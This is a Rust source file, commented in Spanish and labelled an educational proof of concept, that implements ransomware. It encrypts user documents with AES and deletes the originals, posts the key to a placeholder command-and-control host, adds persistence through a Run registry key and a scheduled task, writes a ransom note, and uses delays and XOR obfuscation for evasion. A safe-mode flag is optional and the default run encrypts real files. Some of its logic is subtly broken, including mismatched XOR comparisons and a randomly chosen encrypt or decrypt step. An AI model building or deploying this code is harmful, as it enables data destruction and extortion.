/*!
   ============================================================================================
   EDUCATIONAL RANSOMWARE PoC
   ---------------------------
   Este proyecto es un PoC para demostrar el flujo de un ransomware
   básico: generación de claves, cifrado/descifrado de archivos, persistencia y nota de rescate.

   QUE HACE:
   - Muestra cómo se implementan técnicas de ofuscación (xor_string).
   - Explica persistencia simple (registro y tarea programada).
   - Incluye un “modo seguro” para no dañar archivos reales.
   - Ofrece una sección de “detección” para mostrar cómo se podría descubrir este ransomware.

   NO EJECUTAR EN SISTEMAS DE PRODUCCIÓN. USO BAJO TU PROPIO RIESGO, SOLO EN LABORATORIOS CONTROLADOS.
   ============================================================================================
*/

extern crate aes;
extern crate rand;
extern crate reqwest;
extern crate walkdir;
extern crate base64;

use aes::cipher::{KeyIvInit, StreamCipher};
use rand::Rng;
use reqwest::blocking::Client;
use reqwest::header::USER_AGENT;
use walkdir::WalkDir;
use std::ffi::CString;
use std::fs::{File, remove_file};
use std::io::{Read, Write};
use std::os::windows::ffi::OsStringExt;
use std::path::Path;
use std::process::Command;
use std::ptr;
use std::thread;
use std::time::Duration;
use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW};
use winapi::um::winnt::{KEY_WRITE, REG_SZ};

// Constantes
const BUFFER_SIZE: usize = 1024;
const XOR_KEY: u8 = 42; // Para ofuscación simple de cadenas

// =====================================================================================
// MÓDULO DE DETECCIÓN (EJEMPLO BÁSICO)
// En un laboratorio o entorno real, se podrían implementar más checks, como análisis
// de logs, regex en archivos, reglas YARA, etc.
// =====================================================================================
mod detection {
    use std::path::Path;
    /// Comprueba si existe un archivo de rescate como indicador de ransomware.
    pub fn ransom_note_detected(note_path: &str) -> bool {
        Path::new(note_path).exists()

//
    }
}

// =====================================================================================
// FUNCIÓN DE OFUSCACIÓN BÁSICA (XOR)
// =====================================================================================
fn xor_string(data: &str, key: u8) -> String {
    data.bytes().map(|b| (b ^ key) as char).collect()
}

// =====================================================================================
// GENERACIÓN DE CLAVE AES E IV
// =====================================================================================
fn generate_key() -> (Vec<u8>, Vec<u8>) {
    let key: Vec<u8> = (0..32).map(|_| rand::thread_rng().gen::<u8>()).collect(); // 256 bits
    let iv: Vec<u8> = (0..16).map(|_| rand::thread_rng().gen::<u8>()).collect();  // 128 bits
    (key, iv)
}

// =====================================================================================
// COMUNICACIÓN CON SERVIDOR DE COMANDO Y CONTROL (C2)
// =====================================================================================
fn send_key_to_c2(key: &[u8], iv: &[u8]) {
    let client = Client::new();
    let url = "https://yourc2server.com/receive_key";  // Reemplaza con tu dominio de pruebas

    let data = serde_json::json!({
        "key": base64::encode(key),
        "iv": base64::encode(iv)
    });

    // AV / EDR PODRÍA DETECTAR:
    // - Conexiones salientes a dominios desconocidos
    // - Solicitudes HTTP con patrones inusuales
    let _res = client.post(url)
        .header(USER_AGENT, "MyRansomware")
        .json(&data)
        .send()
        .expect("Failed to send data to C2");
}

// =====================================================================================
// GUARDAR CLAVES LOCALMENTE (SOLO PARA DEMO / DEPURACIÓN)
// =====================================================================================
fn save_key(key: &[u8], iv: &[u8]) {
    let file_name = xor_string("secret.key", XOR_KEY);
    let mut key_file = File::create(&file_name).expect("Unable to create key file");
    key_file.write_all(key).expect("Unable to write key");
    key_file.write_all(iv).expect("Unable to write IV");
}

// =====================================================================================
// PERSISTENCIA SIMPLE EN WINDOWS
// =====================================================================================
fn add_to_registry() {
    unsafe {
        // Típicamente, los AV/EDR vigilan claves Run/RunOnce
        let hkey = winapi::um::winreg::HKEY_LOCAL_MACHINE;
        let subkey = CString::new(r"Software\Microsoft\Windows\CurrentVersion\Run").unwrap();
        let app_name = CString::new("MyRansomware").unwrap();
        let app_path = CString::new(r"C:\path\to\your\ransomware.exe").unwrap();

        let mut hkey_result = std::ptr::null_mut();
        RegCreateKeyExW(
            hkey,
            subkey.as_ptr(),
            0,
            std::ptr::null_mut(),
            0,
            KEY_WRITE,
            std::ptr::null_mut(),
            &mut hkey_result,
            std::ptr::null_mut()
        );
        RegSetValueExW(
            hkey_result,
            app_name.as_ptr(),
            0,
            REG_SZ,
            app_path.as_ptr() as *const u8,
            app_path.to_bytes().len() as u32
        );
    }
}

fn create_task() {
    // Los AV pueden monitorear "schtasks" o logs de eventos cuando se crean tareas programadas
    Command::new("schtasks")
        .arg("/create")
        .arg("/tn")
        .arg("MyRansomware")
        .arg("/tr")
        .arg(r"C:\path\to\your\ransomware.exe")
        .arg("/sc")
        .arg("onstart")
        .output()
        .expect("Failed to create scheduled task");
}

// =====================================================================================
// CIFRADO / DESCIFRADO DINÁMICO (CTR) - EJEMPLO BÁSICO
// =====================================================================================
fn dynamic_encrypt(buffer: &mut [u8], key: &[u8], iv: &[u8]) {
    // En modo CTR, cifrado y descifrado son equivalentes.
    // Ransomware reales suelen usar CBC con padding propio o incluso híbridos con RSA.
    let mut cipher = aes::ctr::Ctr256BE::new_from_slices(key, iv)
        .expect("Error creating cipher in CTR mode");
    cipher.apply_keystream(buffer);
}

fn dynamic_decrypt(buffer: &mut [u8], key: &[u8], iv: &[u8]) {
    // Para CTR, podemos usar la misma función
    dynamic_encrypt(buffer, key, iv);
}

// =====================================================================================
// CIFRADO Y DESCIFRADO DE ARCHIVOS
// =====================================================================================
fn encrypt_file(file: &Path, key: &[u8], iv: &[u8]) {
    let mut input_file = File::open(file).expect("Unable to open file");
    let mut output_file = File::create("temp.enc").expect("Unable to create file");

    let mut buffer = vec![0u8; BUFFER_SIZE];
    while let Ok(bytes_read) = input_file.read(&mut buffer) {
        if bytes_read == 0 {
            break;
        }
        dynamic_encrypt(&mut buffer[..bytes_read], key, iv);
        output_file.write_all(&buffer[..bytes_read]).expect("Error writing to file");
        delay_execution();  // Simular lentitud para evadir
    }
    remove_file(file).expect("Unable to remove original file");
    std::fs::rename("temp.enc", file).expect("Unable to rename file");
}

fn decrypt_file(file: &Path, key: &[u8], iv: &[u8]) {
    let mut input_file = File::open(file).expect("Unable to open file");
    let mut output_file = File::create("temp.dec").expect("Unable to create file");

    let mut buffer = vec![0u8; BUFFER_SIZE];
    while let Ok(bytes_read) = input_file.read(&mut buffer) {
        if bytes_read == 0 {
            break;
        }
        dynamic_decrypt(&mut buffer[..bytes_read], key, iv);
        output_file.write_all(&buffer[..bytes_read]).expect("Error writing to file");
        delay_execution();
    }
    remove_file(file).expect("Unable to remove original file");
    std::fs::rename("temp.dec", file).expect("Unable to rename file");
}

// =====================================================================================
// PROCESAR DIRECTORIO: RECORRE ARCHIVOS CON EXTENSIÓN .txt o .doc (OFUSCADAS CON XOR)
// =====================================================================================
fn process_directory(
    op: fn(&Path, &[u8], &[u8]),
    folder: &str,
    key: &[u8],
    iv: &[u8],
    safe_mode: bool
) {
    for entry in WalkDir::new(folder).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let path = entry.path();
            if path.extension().map_or(false, |ext| {
                ext == xor_string("txt", XOR_KEY) || ext == xor_string("doc", XOR_KEY)
            }) {
                if safe_mode {
                    println!("SAFE MODE: Simulando {} en {:?}", if op == encrypt_file { "cifrado" } else { "descifrado" }, path);
                } else {
                    op(path, key, iv);
                    println!("Processed {:?}", path);
                }
            }
        }
    }
}

// =====================================================================================
// ENCRIPTAR / DESENCRIPTAR DIRECTORIO COMPLETO
// =====================================================================================
fn encrypt_directory(folder: &str, key: &[u8], iv: &[u8], safe_mode: bool) {
    process_directory(encrypt_file, folder, key, iv, safe_mode);
}

fn decrypt_directory(folder: &str, key: &[u8], iv: &[u8], safe_mode: bool) {
    process_directory(decrypt_file, folder, key, iv, safe_mode);
}

// =====================================================================================
// CREAR NOTA DE RESCATE
// =====================================================================================
fn create_ransom_note() {
    // AV detecta strings típicas ("Your files have been encrypted!") en binarios, YARA, etc.
    let note_path = xor_string("C:\\Users\\YourUser\\ransom_note.txt", XOR_KEY);
    let mut note_file = File::create(&note_path).expect("Unable to create ransom note");
    let note_content = xor_string("Your files have been encrypted!", XOR_KEY);
    writeln!(note_file, "{}", note_content).expect("Error writing ransom note");
}

// =====================================================================================
// RETARDO ALEATORIO (EVASIÓN BÁSICA)
// =====================================================================================
fn delay_execution() {
    let delay_time = rand::thread_rng().gen_range(2..5); // Pausa de 2-5 seg
    thread::sleep(Duration::from_secs(delay_time));
}

// =====================================================================================
// MAIN
// =====================================================================================
fn main() {
    // ---------------------------------------------------------------------------------
    // MODO SEGURO
    // ---------------------------------------------------------------------------------
    // Usa, por ejemplo, `cargo run -- safe-mode` para no cifrar realmente los archivos.
    let args: Vec<String> = std::env::args().collect();
    let safe_mode = args.iter().any(|arg| arg == "--safe-mode");
    if safe_mode {
        println!("=========================================");
        println!(" MODO SEGURO ACTIVADO: NO SE CIFRARÁN ARCHIVOS REALES");
        println!("=========================================");
    } else {
        println!("=========================================");
        println!(" MODO NORMAL: SE CIFRARÁN ARCHIVOS REALMENTE");
        println!("=========================================");
    }

    // ---------------------------------------------------------------------------------
    // DEMO DE DETECCIÓN (ANTES DE EMPEZAR)
    // ---------------------------------------------------------------------------------
    let ransom_note_path = xor_string("C:\\Users\\YourUser\\ransom_note.txt", XOR_KEY);
    if detection::ransom_note_detected(&ransom_note_path) {
        println!("[DETECTION] Ya existe una nota de rescate en el sistema.");
    } else {
        println!("[DETECTION] No se detectó nota de rescate aún.");
    }

    // ---------------------------------------------------------------------------------
    // EJEMPLO DE GENERACIÓN DE CLAVES Y ENVÍO A C2
    // ---------------------------------------------------------------------------------
    let (key, iv) = generate_key();
    if !safe_mode {
        send_key_to_c2(&key, &iv);  
        save_key(&key, &iv);       // Omitir en producción real
    } else {
        println!("SAFE MODE: Clave e IV generadas, pero no se envían a C2 ni se guardan localmente.");
    }

    // ---------------------------------------------------------------------------------
    // DETERMINA SI CIFRA O DESCIFRA (RANDOM)
    // ---------------------------------------------------------------------------------
    let random_action: u8 = rand::thread_rng().gen();
    let folder_path = xor_string("C:\\Users\\YourUser", XOR_KEY);

    if random_action % 2 == 0 {
        println!("Encrypting files...");
        encrypt_directory(&folder_path, &key, &iv, safe_mode);
    } else {
        println!("Decrypting files...");
        decrypt_directory(&folder_path, &key, &iv, safe_mode);
    }

    // ---------------------------------------------------------------------------------
    // CREACIÓN DE NOTA DE RESCATE
    // ---------------------------------------------------------------------------------
    if !safe_mode {
        create_ransom_note();
    } else {
        println!("SAFE MODE: No se crea la nota de rescate real.");
    }

    // ---------------------------------------------------------------------------------
    // PERSISTENCIA (REGISTRO Y TAREA PROGRAMADA)
    // ---------------------------------------------------------------------------------
    // Si solo estás haciendo una demo, podrías comentar o condicionar esto
    // para evitar modificar el sistema.
    if !safe_mode {
        add_to_registry();
        create_task();
    } else {
        println!("SAFE MODE: No se añade persistencia en registro ni tareas programadas.");
    }

    // ---------------------------------------------------------------------------------
    // ELIMINA ARCHIVO DE CLAVE (TEMPORAL)
    // ---------------------------------------------------------------------------------
    let key_file_name = xor_string("secret.key", XOR_KEY);
    if !safe_mode {
        remove_file(&key_file_name).ok();
        println!("Ransom note created. Key removed.");
    } else {
        println!("SAFE MODE: No se elimina ningún archivo de clave, porque no se generó uno real.");
    }

    // ---------------------------------------------------------------------------------
    // DEMO DE DETECCIÓN (DESPUÉS DE EJECUTAR)
    // ---------------------------------------------------------------------------------
    if detection::ransom_note_detected(&ransom_note_path) {
        println!("[DETECTION] Se detecta la nota de rescate creada en {:?}.", ransom_note_path);
    } else {
        println!("[DETECTION] No se encuentra la nota de rescate. (Safe Mode o Error)");
    }

    println!("=== Proceso finalizado ===");
}

